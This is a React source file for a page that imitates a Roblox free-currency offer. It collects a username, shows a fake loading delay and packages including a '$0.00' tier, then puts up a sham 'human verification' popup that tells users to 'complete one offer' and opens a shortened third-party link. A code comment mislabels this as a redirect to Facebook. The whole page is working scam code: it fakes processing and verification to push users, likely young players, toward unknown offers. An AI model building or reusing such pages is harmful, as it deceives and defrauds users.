import React, { useState } from 'react';
import robloxBanner from '../assets/ROBLOX/roblox.webp';
import moneyIcon from '../assets/ROBLOX/money_icon.png';
import verificationIcon from '../assets/ROBLOX/verification_icon.png';

const Roblox = () => {
  const [username, setUsername] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPackages, setShowPackages] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [selectedPackage, setSelectedPackage] = useState(null);

  const RobloxPackages = [
    { price: "$0.00", amount: "1,000", id: 1 },
    { price: "$1.00", amount: "5,000", id: 2 },
    { price: "$3.00", amount: "10,000", id: 3 },
    { price: "$5.00", amount: "25,000", id: 4 }
  ];

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
      setShowPackages(true);
    }, 2000);
  };

  const handlePackageSelect = (pkg) => {
    setSelectedPackage(pkg);
    setShowVerification(true);
  };

  const handleVerificationComplete = () => {
    // Redirect to Facebook in a new tab
    window.open('https://smrturl.co/846d027	', '_blank');
    setShowVerification(false);
    setShowPackages(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 font-sans relative">
      {/* Top Navbar - Mobile responsive */}
      <div className="flex justify-between items-center px-4 sm:px-6 py-4 bg-gray-200 text-sm">
        <div className="text-gray-700 font-semibold">☰</div>
        <div className="flex space-x-3 sm:space-x-6 text-gray-700">
          <span className="hidden sm:inline">Discover</span>
          <span className="hidden sm:inline">Marketplace</span>
          <span>Roblox</span>
        </div>
      </div>

      {/* Banner - Responsive height */}
      <div className="w-full h-32 sm:h-48 relative">
        <img
          src={robloxBanner}
          alt="Roblox Banner"
          className="absolute w-full h-full object-cover"
        />
        <div className="absolute inset-0  bg-opacity-30 flex flex-col items-center justify-center p-4 text-center">
          <p className="text-white text-xs sm:text-sm md:text-base max-w-2xl mx-auto">
            Roblox allows you to purchase upgrades for your avatar or buy special abilities in experiences.
          </p>
        </div>
      </div>

      {/* Loading State */}
      {isLoading && (
        <div className="w-full px-4 mt-8 sm:mt-10">
          <div className="max-w-screen-md mx-auto bg-white shadow-md rounded-md p-6 sm:p-8 text-center">
            <img 
              src={moneyIcon} 
              alt="Loading" 
              className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-4 animate-pulse"
            />
            <p className="text-gray-600 text-sm sm:text-base">Loading packages for {username}...</p>
          </div>
        </div>
      )}

      {/* Verification Modal Popup */}
      {showVerification && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg max-w-md w-full mx-2 overflow-hidden">
            <div className="p-6 text-center">
              <img 
                src={verificationIcon} 
                alt="Verification" 
                className="w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-4"
              />
              <h2 className="text-xl sm:text-2xl font-bold mb-2">Last step</h2>
              <p className="text-gray-600 text-sm sm:text-base mb-4">
                Please verify that you are not a robot to claim Roblox!
              </p>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                <h3 className="text-base sm:text-lg font-semibold text-blue-800 mb-2">Human Verification</h3>
                <p className="text-xs sm:text-sm text-gray-600 mb-4">
                  Complete one offer below to download your game.
                </p>
                <button 
                  onClick={handleVerificationComplete}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 sm:py-3 rounded-lg font-bold transition text-sm sm:text-base"
                >
                  Tap to claim your reward!
                </button>
                <button 
                  onClick={handleVerificationComplete}
                  className="w-full bg-blue-600 mt-3 hover:bg-blue-700 text-white py-2 sm:py-3 rounded-lg font-bold transition text-sm sm:text-base"
                >
                  Enter Details to Open Mystery Box!
                </button>
              </div>

              <p className="italic text-red-500 text-xs sm:text-sm">Waiting for verification...</p>
            </div>
          </div>
        </div>
      )}

      {/* Packages Display - Responsive grid */}
      {showPackages && !showVerification && (
        <div className="w-full px-4 mt-8 sm:mt-10">
          <div className="max-w-screen-md mx-auto bg-white shadow-md rounded-md p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-bold mb-4 sm:mb-6 text-center">Select Roblox Package</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
              {RobloxPackages.map((pkg) => (
                <div 
                  key={pkg.id}
                  className="flex justify-between items-center p-3 sm:p-4 border border-gray-200 rounded-lg hover:bg-gray-50 transition"
                >
                  <div className="flex items-center">
                    <img 
                      src={moneyIcon} 
                      alt="Money" 
                      className="w-6 h-6 sm:w-8 sm:h-8 mr-2 sm:mr-3"
                    />
                    <div>
                      <p className="text-green-600 font-bold text-sm sm:text-base">{pkg.price}</p>
                      <p className="text-gray-500 text-xs sm:text-sm">Roblox Amount</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-bold text-base sm:text-lg">{pkg.amount}</p>
                    <button 
                      onClick={() => handlePackageSelect(pkg)}
                      className="mt-1 sm:mt-2 bg-green-600 hover:bg-green-700 text-white py-1 px-2 sm:px-3 rounded text-xs sm:text-sm transition"
                    >
                      Select
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Form Display - Responsive */}
      {!isLoading && !showPackages && !showVerification && (
        <form onSubmit={handleSubmit} className="w-full px-4 mt-8 sm:mt-10">
          <div className="max-w-screen-md mx-auto bg-white shadow-md rounded-md p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Roblox Username</h2>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Enter username"
              className="w-full px-3 sm:px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 text-sm sm:text-base"
              required
            />
            <button 
              type="submit"
              className="mt-3 sm:mt-4 w-full bg-green-700 text-white py-2 rounded-md hover:bg-green-800 transition text-sm sm:text-base"
            >
              Next
            </button>
          </div>
        </form>
      )}
    </div>
  );
};

export default Roblox;